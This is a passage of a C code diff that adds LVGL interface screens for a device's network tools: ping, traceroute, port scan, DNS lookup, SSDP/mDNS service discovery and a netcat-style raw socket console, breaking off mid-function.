+    if (s_ntd_bar)    lv_bar_set_value(s_ntd_bar, nocsif_nettools_progress(), LV_ANIM_OFF);
+    uint32_t g = nocsif_nettools_gen();
+    if (g != s_ntd_gen_seen) { s_ntd_gen_seen = g; nt_dev_fill_fp(); nt_fill_ports(s_ntd_list); }
+}
+static void nt_dev_ping_cb(lv_event_t *e)  { (void)e; nt_start_ping(s_nt_target); }
+static void nt_dev_trace_cb(lv_event_t *e) { (void)e; nocsif_nettools_request_traceroute(s_nt_target); nocsif_nav_push(build_nt_trace()); }
+static void nt_dev_full_cb(lv_event_t *e)  { (void)e; nocsif_nettools_request_scan(s_nt_target, k_nt_top100, NT_N(k_nt_top100), true); nocsif_nav_push(build_nt_scan()); }
+static void nt_dev_log_cb(lv_event_t *e)   { (void)e; nocsif_nettools_request_log(); }
+static void nt_dev_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    s_ntd_fp = s_ntd_status = s_ntd_bar = s_ntd_list = NULL;
+}
+
+static lv_obj_t *build_nt_device(void)
+{
+    char ips[16]; nocsif_nettools_ip_str(s_nt_target, ips, sizeof ips);
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Device", ips, &content);
+    lv_obj_set_style_pad_hor(content, 24, 0);
+
+    s_ntd_fp = lv_label_create(content);
+    lv_label_set_long_mode(s_ntd_fp, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_ntd_fp, lv_pct(100));
+    lv_obj_add_style(s_ntd_fp, &nocsif_style_font_tag, 0);   /* scales with the type scale */
+    lv_obj_set_style_text_color(s_ntd_fp, NOCSIF_WHITE, 0);
+    lv_obj_set_style_pad_bottom(s_ntd_fp, 6, 0);
+    lv_label_set_text(s_ntd_fp, "probing…");
+
+    s_ntd_status = lv_label_create(content);
+    lv_label_set_long_mode(s_ntd_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_ntd_status, lv_pct(100));
+    lv_obj_add_style(s_ntd_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_ntd_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_ntd_status, nocsif_nettools_status_str());
+
+    s_ntd_bar = nt_progress_bar(content);
+
+    lv_obj_t *acts = lv_obj_create(content);
+    lv_obj_remove_style_all(acts);
+    lv_obj_set_width(acts, lv_pct(100));
+    lv_obj_set_height(acts, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(acts, LV_FLEX_FLOW_ROW_WRAP);
+    lv_obj_set_flex_align(acts, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_row(acts, 8, 0);
+    lv_obj_set_style_pad_column(acts, 8, 0);
+    lv_obj_clear_flag(acts, LV_OBJ_FLAG_SCROLLABLE);
+    (void) nt_btn(acts, "Ping",       nt_dev_ping_cb);
+    (void) nt_btn(acts, "Traceroute", nt_dev_trace_cb);
+    (void) nt_btn(acts, "Full scan",  nt_dev_full_cb);
+    (void) nt_btn(acts, "Save",       nt_dev_log_cb);
+
+    s_ntd_list = lv_obj_create(content);
+    lv_obj_remove_style_all(s_ntd_list);
+    lv_obj_set_width(s_ntd_list, lv_pct(100));
+    lv_obj_set_height(s_ntd_list, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(s_ntd_list, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(s_ntd_list, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_style_pad_top(s_ntd_list, 8, 0);
+
+    s_ntd_gen_seen = nocsif_nettools_gen() - 1;   /* force a first fill */
+    nt_dev_fill_fp();
+    nt_fill_ports(s_ntd_list);
+
+    lv_timer_t *timer = lv_timer_create(nt_dev_tick, 500, NULL);
+    lv_obj_add_event_cb(scr, nt_dev_deleted_cb, LV_EVENT_DELETE, timer);
+    return scr;
+}
+
+/* ---- DNS toolkit ---- */
+static const struct { const char *nm; int t; } k_dns_types[] = {
+    {"A", NT_DNS_A}, {"AAAA", NT_DNS_AAAA}, {"CNAME", NT_DNS_CNAME}, {"MX", NT_DNS_MX},
+    {"TXT", NT_DNS_TXT}, {"NS", NT_DNS_NS}, {"PTR", NT_DNS_PTR}, {"SOA", NT_DNS_SOA}, {"SRV", NT_DNS_SRV},
+};
+static char       s_nt_dns_name[128];
+static int        s_nt_dns_ti;
+static lv_obj_t  *s_ntdns_name_lbl, *s_ntdns_type_lbl, *s_ntdns_status, *s_ntdns_list, *s_ntdns_ta;
+static uint32_t   s_ntdns_gen_seen;
+
+static void nt_dns_name_go(lv_event_t *e)
+{
+    (void)e;
+    if (s_ntdns_ta) snprintf(s_nt_dns_name, sizeof s_nt_dns_name, "%s", lv_textarea_get_text(s_ntdns_ta));
+    nocsif_nav_back();
+}
+static lv_obj_t *build_nt_dns_edit(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Query name", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_t *hint = lv_label_create(content);
+    lv_label_set_text(hint, "Host / domain (or a.b.c.d for PTR)");
+    lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+    lv_obj_t *ta = lv_textarea_create(content);
+    lv_textarea_set_one_line(ta, true);
+    lv_textarea_set_accepted_chars(ta, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_");
+    lv_textarea_set_max_length(ta, 120);
+    lv_textarea_set_text(ta, s_nt_dns_name);
+    lv_obj_set_width(ta, lv_pct(100));
+    nocsif_label_font_scaled(ta, &nocsif_mono_16);
+    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
+    lv_obj_set_style_text_color(ta, NOCSIF_WHITE, 0);
+    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(ta, 1, 0);
+    s_ntdns_ta = ta;
+    nt_action_btn(scr, "Set", nt_dns_name_go, NULL);
+    nocsif_kb_attach(scr, ta, NOCSIF_KB_URL);
+    return scr;
+}
+static void nt_dns_name_cb(lv_event_t *e) { (void)e; nocsif_nav_push(build_nt_dns_edit()); }
+static void nt_dns_type_cb(lv_event_t *e)
+{
+    (void)e;
+    s_nt_dns_ti = (s_nt_dns_ti + 1) % NT_N(k_dns_types);
+    if (s_ntdns_type_lbl) lv_label_set_text(s_ntdns_type_lbl, k_dns_types[s_nt_dns_ti].nm);
+}
+static void nt_dns_go_cb(lv_event_t *e)
+{
+    (void)e;
+    if (!s_nt_dns_name[0]) { nocsif_toast("Set a query name first"); return; }
+    nocsif_nettools_request_dns(s_nt_dns_name, k_dns_types[s_nt_dns_ti].t, 0);
+}
+static void nt_dns_fill(void)
+{
+    if (!s_ntdns_list) return;
+    lv_obj_clean(s_ntdns_list);
+    int n = nocsif_nettools_dns_count();
+    if (n == 0) {
+        lv_obj_t *e = lv_label_create(s_ntdns_list);
+        lv_label_set_text(e, nocsif_nettools_busy() ? "querying…" : "no records yet");
+        lv_obj_add_style(e, &nocsif_style_font_caption, 0);
+        lv_obj_set_style_text_color(e, NOCSIF_ASH, 0);
+        return;
+    }
+    for (int i = 0; i < n; i++) {
+        char rec[NOCSIF_NT_DNS_REC];
+        if (!nocsif_nettools_dns_get(i, rec, sizeof rec)) continue;
+        nt_line_row(s_ntdns_list, rec, NOCSIF_BONE);
+    }
+}
+static void nt_dns_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_ntdns_name_lbl) lv_label_set_text(s_ntdns_name_lbl, s_nt_dns_name[0] ? s_nt_dns_name : "tap to set");
+    if (s_ntdns_status)   lv_label_set_text(s_ntdns_status, nocsif_nettools_status_str());
+    uint32_t g = nocsif_nettools_gen();
+    if (g != s_ntdns_gen_seen) { s_ntdns_gen_seen = g; nt_dns_fill(); }
+}
+static void nt_dns_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    s_ntdns_name_lbl = s_ntdns_type_lbl = s_ntdns_status = s_ntdns_list = NULL;
+}
+static lv_obj_t *build_nt_dns(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("DNS Lookup", "dig-style " NOCSIF_DOT " uses your resolver", &content);
+    lv_obj_t *list = nocsif_menu_list(content);
+
+    lv_obj_t *nacc = NULL;
+    wifi_menu_row(list, "Query name", NOCSIF_BONE, s_nt_dns_name[0] ? s_nt_dns_name : "tap to set", &nacc, nt_dns_name_cb, NULL);
+    s_ntdns_name_lbl = nacc;
+    lv_obj_t *tacc = NULL;
+    wifi_menu_row(list, "Record type", NOCSIF_BONE, k_dns_types[s_nt_dns_ti].nm, &tacc, nt_dns_type_cb, NULL);
+    s_ntdns_type_lbl = tacc;
+    wifi_menu_row(list, "Look up", NOCSIF_VIOLET, ">", NULL, nt_dns_go_cb, NULL);
+
+    s_ntdns_status = lv_label_create(list);
+    lv_obj_set_width(s_ntdns_status, lv_pct(100));
+    lv_obj_add_style(s_ntdns_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_ntdns_status, NOCSIF_STEEL, 0);
+    lv_obj_set_style_pad_top(s_ntdns_status, 6, 0);
+    lv_label_set_text(s_ntdns_status, "");
+
+    s_ntdns_list = lv_obj_create(list);
+    lv_obj_remove_style_all(s_ntdns_list);
+    lv_obj_set_width(s_ntdns_list, lv_pct(100));
+    lv_obj_set_height(s_ntdns_list, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(s_ntdns_list, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(s_ntdns_list, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_style_pad_top(s_ntdns_list, 6, 0);
+
+    s_ntdns_gen_seen = nocsif_nettools_gen() - 1;
+    nt_dns_fill();
+
+    lv_timer_t *timer = lv_timer_create(nt_dns_tick, 400, NULL);
+    lv_obj_add_event_cb(scr, nt_dns_deleted_cb, LV_EVENT_DELETE, timer);
+    return scr;
+}
+
+/* ---- traceroute ---- */
+static lv_obj_t *s_ntt_status, *s_ntt_bar, *s_ntt_list;
+static uint32_t  s_ntt_gen_seen;
+
+static void nt_trace_fill(void)
+{
+    if (!s_ntt_list) return;
+    lv_obj_clean(s_ntt_list);
+    int n = nocsif_nettools_hop_count();
+    for (int i = 0; i < n; i++) {
+        nocsif_nt_hop_t h;
+        if (!nocsif_nettools_hop_get(i, &h)) continue;
+        char line[48];
+        if (h.ip) {
+            char ips[16]; nocsif_nettools_ip_str(h.ip, ips, sizeof ips);
+            if (h.rtt_ms >= 0) snprintf(line, sizeof line, "%2d  %s  %d ms", h.hop, ips, h.rtt_ms);
+            else               snprintf(line, sizeof line, "%2d  %s", h.hop, ips);
+        } else {
+            snprintf(line, sizeof line, "%2d  *", h.hop);
+        }
+        nt_line_row(s_ntt_list, line, h.reached ? NOCSIF_VIOLET : (h.ip ? NOCSIF_BONE : NOCSIF_ASH));
+    }
+}
+static void nt_trace_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_ntt_status) lv_label_set_text(s_ntt_status, nocsif_nettools_status_str());
+    if (s_ntt_bar)    lv_bar_set_value(s_ntt_bar, nocsif_nettools_progress(), LV_ANIM_OFF);
+    uint32_t g = nocsif_nettools_gen();
+    if (g != s_ntt_gen_seen) { s_ntt_gen_seen = g; nt_trace_fill(); }
+}
+static void nt_trace_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    s_ntt_status = s_ntt_bar = s_ntt_list = NULL;
+}
+static lv_obj_t *build_nt_trace(void)
+{
+    char ips[16]; nocsif_nettools_ip_str(s_nt_target, ips, sizeof ips);
+    char sub[32]; snprintf(sub, sizeof sub, "to %s", ips);
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Traceroute", sub, &content);
+    lv_obj_set_style_pad_hor(content, 24, 0);
+
+    s_ntt_status = lv_label_create(content);
+    lv_label_set_long_mode(s_ntt_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_ntt_status, lv_pct(100));
+    lv_obj_add_style(s_ntt_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_ntt_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_ntt_status, nocsif_nettools_status_str());
+
+    s_ntt_bar = nt_progress_bar(content);
+
+    s_ntt_list = lv_obj_create(content);
+    lv_obj_remove_style_all(s_ntt_list);
+    lv_obj_set_width(s_ntt_list, lv_pct(100));
+    lv_obj_set_height(s_ntt_list, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(s_ntt_list, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(s_ntt_list, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_style_pad_top(s_ntt_list, 8, 0);
+
+    s_ntt_gen_seen = nocsif_nettools_gen() - 1;
+    nt_trace_fill();
+
+    lv_timer_t *timer = lv_timer_create(nt_trace_tick, 500, NULL);
+    lv_obj_add_event_cb(scr, nt_trace_deleted_cb, LV_EVENT_DELETE, timer);
+    return scr;
+}
+
+/* ---- service discovery (SSDP / mDNS) — lean rows/cards + drill-in detail ---- */
+static lv_obj_t *s_ntdisc_status, *s_ntdisc_bar, *s_ntdisc_list, *s_ntdisc_start;
+static uint32_t  s_ntdisc_gen_seen;
+static int       s_ntdisc_sel;      /* row tapped for the detail screen */
+
+typedef struct { char kind[6]; char svc[24]; char name[88]; char addr[24]; char raw[NOCSIF_NT_DISC_REC]; } nt_svc_row_t;
+
+/* Friendly label for an mDNS service type (_googlecast -> Cast, _smb -> Files, …). */
+static const char *nt_mdns_friendly(const char *svc)
+{
+    if (strstr(svc, "http"))                                       return "Web";
+    if (strstr(svc, "ssh") || strstr(svc, "sftp"))                 return "SSH";
+    if (strstr(svc, "smb") || strstr(svc, "afp"))                  return "Files";
+    if (strstr(svc, "ipp") || strstr(svc, "print") || strstr(svc, "pdl")) return "Printer";
+    if (strstr(svc, "airplay") || strstr(svc, "raop"))             return "AirPlay";
+    if (strstr(svc, "googlecast"))                                 return "Cast";
+    if (strstr(svc, "spotify"))                                    return "Spotify";
+    if (strstr(svc, "hap"))                                        return "HomeKit";
+    if (strstr(svc, "workstation") || strstr(svc, "device-info"))  return "Device";
+    return (svc[0] == '_') ? svc + 1 : svc;
+}
+
+/* Split a stored discovery line ("UPnP  <ip>  <server>" / "mDNS  <svc>  <name>  <ip:port>") into fields
+ * (delimiter is a double space). Prototype: parses the existing text so the redesign is UI-only. */
+static void nt_svc_parse(const char *rec, nt_svc_row_t *o)
+{
+    memset(o, 0, sizeof *o);
+    snprintf(o->raw, sizeof o->raw, "%s", rec);
+    char tmp[NOCSIF_NT_DISC_REC]; snprintf(tmp, sizeof tmp, "%s", rec);
+    char *tok[6]; int nt = 0; char *p = tmp;
+    while (*p && nt < 6) {
+        while (*p == ' ') p++;
+        if (!*p) break;
+        tok[nt++] = p;
+        char *q = strstr(p, "  ");
+        if (!q) break;
+        *q = '\0'; p = q + 2;
+    }
+    if (nt >= 1) snprintf(o->kind, sizeof o->kind, "%s", tok[0]);
+    if (strcmp(o->kind, "mDNS") == 0) {
+        if (nt >= 2) snprintf(o->svc,  sizeof o->svc,  "%s", nt_mdns_friendly(tok[1]));
+        if (nt >= 3) snprintf(o->name, sizeof o->name, "%s", tok[2]);
+        if (nt >= 4) snprintf(o->addr, sizeof o->addr, "%s", tok[3]);
+    } else {
+        snprintf(o->svc, sizeof o->svc, "UPnP");
+        if (nt >= 2) snprintf(o->addr, sizeof o->addr, "%s", tok[1]);
+        if (nt >= 3) snprintf(o->name, sizeof o->name, "%s", tok[2]);
+    }
+}
+
+/* A labelled value block for the detail screen (skips empty values). */
+static void nt_kv(lv_obj_t *parent, const char *k, const char *v)
+{
+    if (!v || !v[0]) return;
+    lv_obj_t *kl = lv_label_create(parent);
+    lv_label_set_text(kl, k);
+    lv_obj_add_style(kl, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(kl, NOCSIF_STEEL, 0);
+    lv_obj_set_style_pad_top(kl, 10, 0);
+    lv_obj_t *vl = lv_label_create(parent);
+    lv_label_set_long_mode(vl, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(vl, lv_pct(100));
+    lv_label_set_text(vl, v);
+    lv_obj_add_style(vl, &nocsif_style_row_name, 0);
+    lv_obj_set_style_text_color(vl, NOCSIF_BONE, 0);
+}
+
+static lv_obj_t *build_nt_svc_detail(void)
+{
+    char rec[NOCSIF_NT_DISC_REC] = "";
+    nocsif_nettools_disc_get(s_ntdisc_sel, rec, sizeof rec);
+    nt_svc_row_t r; nt_svc_parse(rec, &r);
+
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold(r.svc[0] ? r.svc : "Service", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 24, 0);
+
+    lv_obj_t *nm = lv_label_create(content);
+    lv_label_set_long_mode(nm, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(nm, lv_pct(100));
+    lv_label_set_text(nm, r.name[0] ? r.name : (r.addr[0] ? r.addr : "service"));
+    lv_obj_add_style(nm, &nocsif_style_row_name, 0);
+    lv_obj_set_style_text_color(nm, NOCSIF_WHITE, 0);
+
+    nt_kv(content, "discovered by", r.kind);
+    nt_kv(content, "service",       r.svc);
+    nt_kv(content, "address",       r.addr);
+    if (strcmp(r.kind, "UPnP") == 0) nt_kv(content, "server", r.name);
+    return scr;
+}
+
+static void nt_disc_row_cb(lv_event_t *e)
+{
+    s_ntdisc_sel = (int)(intptr_t)lv_event_get_user_data(e);
+    nocsif_nav_push(build_nt_svc_detail());
+}
+
+static void nt_disc_fill(void)
+{
+    if (!s_ntdisc_list) return;
+    lv_obj_clean(s_ntdisc_list);
+    int n = nocsif_nettools_disc_count();
+    if (n == 0) {
+        lv_obj_t *e = lv_label_create(s_ntdisc_list);
+        lv_label_set_text(e, nocsif_nettools_busy() ? "discovering…" : "no services yet");
+        lv_obj_add_style(e, &nocsif_style_font_caption, 0);
+        lv_obj_set_style_text_color(e, NOCSIF_ASH, 0);
+        return;
+    }
+    for (int i = 0; i < n; i++) {
+        char rec[NOCSIF_NT_DISC_REC];
+        if (!nocsif_nettools_disc_get(i, rec, sizeof rec)) continue;
+        nt_svc_row_t r; nt_svc_parse(rec, &r);
+        const char *primary = r.name[0] ? r.name : r.addr;
+        char sub[64]; snprintf(sub, sizeof sub, "%s%s%s", r.svc,
+                               (r.svc[0] && r.addr[0]) ? "  " NOCSIF_DOT "  " : "", r.addr);
+
+        lv_obj_t *row = lv_obj_create(s_ntdisc_list);
+        lv_obj_remove_style_all(row);
+        lv_obj_set_width(row, lv_pct(100));
+        lv_obj_set_height(row, LV_SIZE_CONTENT);
+        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_COLUMN);
+        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
+        lv_obj_add_flag(row, LV_OBJ_FLAG_GESTURE_BUBBLE);
+        lv_obj_add_style(row, &nocsif_style_row_press, LV_STATE_PRESSED);
+        lv_obj_add_event_cb(row, nt_disc_row_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
+        lv_obj_set_style_pad_ver(row, 9, 0);          /* row + a hairline divider */
+        lv_obj_set_style_border_side(row, LV_BORDER_SIDE_BOTTOM, 0);
+        lv_obj_set_style_border_width(row, 1, 0);
+        lv_obj_set_style_border_color(row, NOCSIF_EDGE, 0);
+        lv_obj_t *pl = lv_label_create(row);
+        lv_label_set_long_mode(pl, LV_LABEL_LONG_DOT);
+        lv_obj_set_width(pl, lv_pct(100));
+        lv_label_set_text(pl, (primary && primary[0]) ? primary : "service");
+        lv_obj_add_style(pl, &nocsif_style_row_name, 0);
+        lv_obj_set_style_text_color(pl, NOCSIF_WHITE, 0);
+        lv_obj_t *sl = lv_label_create(row);
+        lv_label_set_text(sl, sub);
+        lv_obj_add_style(sl, &nocsif_style_font_caption, 0);
+        lv_obj_set_style_text_color(sl, NOCSIF_STEEL, 0);
+    }
+}
+
+static void nt_disc_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_ntdisc_status) lv_label_set_text(s_ntdisc_status, nocsif_nettools_status_str());
+    if (s_ntdisc_bar)    lv_bar_set_value(s_ntdisc_bar, nocsif_nettools_progress(), LV_ANIM_OFF);
+    if (s_ntdisc_start) {
+        bool busy = nocsif_nettools_busy();
+        lv_label_set_text(s_ntdisc_start, busy ? "Cancel" : "Scan again");
+        lv_obj_set_style_text_color(s_ntdisc_start, busy ? NOCSIF_GOLD : NOCSIF_VIOLET, 0);
+    }
+    uint32_t g = nocsif_nettools_gen();
+    if (g != s_ntdisc_gen_seen) { s_ntdisc_gen_seen = g; nt_disc_fill(); }
+}
+static void nt_disc_start_cb(lv_event_t *e)
+{
+    (void)e;
+    if (nocsif_nettools_busy()) nocsif_nettools_request_cancel();
+    else nocsif_nettools_request_discover();
+}
+static void nt_disc_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    s_ntdisc_status = s_ntdisc_bar = s_ntdisc_list = s_ntdisc_start = NULL;
+}
+static lv_obj_t *build_nt_discover(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Service Discovery", "SSDP / UPnP " NOCSIF_DOT " mDNS", &content);
+    lv_obj_set_style_pad_hor(content, 24, 0);
+
+    s_ntdisc_status = lv_label_create(content);
+    lv_label_set_long_mode(s_ntdisc_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_ntdisc_status, lv_pct(100));
+    lv_obj_add_style(s_ntdisc_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_ntdisc_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_ntdisc_status, nocsif_nettools_status_str());
+
+    s_ntdisc_bar = nt_progress_bar(content);
+    lv_obj_t *srow = wifi_menu_row(content, "Scan services", NOCSIF_VIOLET, NULL, NULL, nt_disc_start_cb, NULL);
+    s_ntdisc_start = lv_obj_get_child(srow, 0);
+
+    s_ntdisc_list = lv_obj_create(content);
+    lv_obj_remove_style_all(s_ntdisc_list);
+    lv_obj_set_width(s_ntdisc_list, lv_pct(100));
+    lv_obj_set_height(s_ntdisc_list, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(s_ntdisc_list, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(s_ntdisc_list, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_style_pad_top(s_ntdisc_list, 8, 0);
+
+    s_ntdisc_gen_seen = nocsif_nettools_gen() - 1;
+    nt_disc_fill();
+    if (nocsif_wifi_connected() && !nocsif_nettools_busy()) nocsif_nettools_request_discover();
+
+    lv_timer_t *timer = lv_timer_create(nt_disc_tick, 500, NULL);
+    lv_obj_add_event_cb(scr, nt_disc_deleted_cb, LV_EVENT_DELETE, timer);
+    return scr;
+}
+
+/* ---- netcat setup ---- */
+static lv_obj_t *s_ncset_host_lbl, *s_ncset_port_lbl, *s_ncset_proto_lbl, *s_ncedit_ta;
+static uint8_t   s_ncedit_field;   /* 0 = host · 1 = port */
+
+static void nt_ncedit_go(lv_event_t *e)
+{
+    (void)e;
+    if (!s_ncedit_ta) return;
+    const char *txt = lv_textarea_get_text(s_ncedit_ta);
+    if (s_ncedit_field == 0) {
+        uint32_t ip;
+        if (!nocsif_nettools_parse_ip(txt, &ip)) { nocsif_toast("Enter a valid IPv4 address"); return; }
+        s_nc_ui_ip = ip; snprintf(s_nc_ui_ipstr, sizeof s_nc_ui_ipstr, "%s", txt);
+        if (s_ncset_host_lbl) lv_label_set_text(s_ncset_host_lbl, s_nc_ui_ipstr);
+    } else {
+        int p = atoi(txt);
+        if (p < 1 || p > 65535) { nocsif_toast("Port must be 1-65535"); return; }
+        s_nc_ui_port = (uint16_t)p;
+        if (s_ncset_port_lbl) { char b[8]; snprintf(b, sizeof b, "%u", s_nc_ui_port); lv_label_set_text(s_ncset_port_lbl, b); }
+    }
+    nocsif_nav_back();
+}
+static lv_obj_t *build_nt_ncedit(void)
+{
+    bool host = (s_ncedit_field == 0);
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold(host ? "Host" : "Port", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_t *hint = lv_label_create(content);
+    lv_label_set_text(hint, host ? "Target host (IPv4)" : "Target port (1-65535)");
+    lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+    lv_obj_t *ta = lv_textarea_create(content);
+    lv_textarea_set_one_line(ta, true);
+    lv_textarea_set_accepted_chars(ta, host ? "0123456789." : "0123456789");
+    lv_textarea_set_max_length(ta, host ? 15 : 5);
+    char seed[16];
+    if (host) snprintf(seed, sizeof seed, "%s", s_nc_ui_ipstr[0] ? s_nc_ui_ipstr : "");
+    else      snprintf(seed, sizeof seed, "%u", s_nc_ui_port);
+    lv_textarea_set_text(ta, seed);
+    lv_obj_set_width(ta, lv_pct(100));
+    nocsif_label_font_scaled(ta, &nocsif_mono_18);
+    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
+    lv_obj_set_style_text_color(ta, NOCSIF_WHITE, 0);
+    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(ta, 1, 0);
+    s_ncedit_ta = ta;
+    nt_action_btn(scr, "Set", nt_ncedit_go, NULL);
+    nocsif_kb_attach(scr, ta, NOCSIF_KB_NUMERIC);
+    return scr;
+}
+static void nt_ncset_host_cb(lv_event_t *e)  { (void)e; s_ncedit_field = 0; nocsif_nav_push(build_nt_ncedit()); }
+static void nt_ncset_port_cb(lv_event_t *e)  { (void)e; s_ncedit_field = 1; nocsif_nav_push(build_nt_ncedit()); }
+static void nt_ncset_proto_cb(lv_event_t *e)
+{
+    (void)e;
+    s_nc_ui_udp = !s_nc_ui_udp;
+    if (s_ncset_proto_lbl) lv_label_set_text(s_ncset_proto_lbl, s_nc_ui_udp ? "UDP" : "TCP");
+}
+static void nt_ncset_connect_cb(lv_event_t *e)
+{
+    (void)e;
+    if (!s_nc_ui_ip) { nocsif_toast("Set a host first"); return; }
+    nocsif_nettools_nc_open(s_nc_ui_ip, s_nc_ui_port, s_nc_ui_udp);
+    nocsif_nav_push(build_nt_nc_console());
+}
+static void nt_ncset_deleted_cb(lv_event_t *e)
+{
+    (void)e;
+    s_ncset_host_lbl = s_ncset_port_lbl = s_ncset_proto_lbl = NULL;
+}
+static lv_obj_t *build_nt_netcat(void)
+{
+    if (!s_nc_ui_ip && s_nt_target) { s_nc_ui_ip = s_nt_target; nocsif_nettools_ip_str(s_nt_target, s_nc_ui_ipstr, sizeof s_nc_ui_ipstr); }
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Netcat", "raw TCP / UDP", &content);
+    lv_obj_t *list = nocsif_menu_list(content);
+
+    lv_obj_t *hacc = NULL;
+    wifi_menu_row(list, "Host", NOCSIF_BONE, s_nc_ui_ipstr[0] ? s_nc_ui_ipstr : "tap to set", &hacc, nt_ncset_host_cb, NULL);
+    s_ncset_host_lbl = hacc;
+    char ps[8]; snprintf(ps, sizeof ps, "%u", s_nc_ui_port);
+    lv_obj_t *pacc = NULL;
+    wifi_menu_row(list, "Port", NOCSIF_BONE, ps, &pacc, nt_ncset_port_cb, NULL);
+    s_ncset_port_lbl = pacc;
+    lv_obj_t *tacc = NULL;
+    wifi_menu_row(list, "Protocol", NOCSIF_BONE, s_nc_ui_udp ? "UDP" : "TCP", &tacc, nt_ncset_proto_cb, NULL);
+    s_ncset_proto_lbl = tacc;
+    wifi_menu_row(list, "Connect", NOCSIF_VIOLET, ">", NULL, nt_ncset_connect_cb, NULL);
+
+    lv_obj_t *note = lv_label_create(list);
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_label_set_text(note, "Opens a raw socket, sends lines, and shows the reply. Tip: tap an open port in a scan to connect straight to it.");
+    lv_obj_add_style(note, &nocsif_style_font_tag_small, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_top(note, 12, 0);
+
+    lv_obj_add_event_cb(scr, nt_ncset_deleted_cb, LV_EVENT_DELETE, NULL);
+    return scr;
+}
+
+/* ---- netcat console ---- */
+static lv_obj_t *s_ncc_status, *s_ncc_body, *s_ncc_scroll, *s_ncsend_ta;
+static uint32_t  s_ncc_gen_seen;
+
+static void nt_ncsend_go(lv_event_t *e)
+{
+    (void)e;
+    if (s_ncsend_ta) nocsif_nettools_nc_send(lv_textarea_get_text(s_ncsend_ta));
+    nocsif_nav_back();
+}
+static lv_obj_t *build_nt_nc_send(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Send", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_t *ta = lv_textarea_create(content);
+    lv_textarea_set_one_line(ta, false);
+    lv_obj_set_width(ta, lv_pct(100));
+    lv_obj_set_height(ta, 60);
+    nocsif_label_font_scaled(ta, &nocsif_mono_16);
+    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
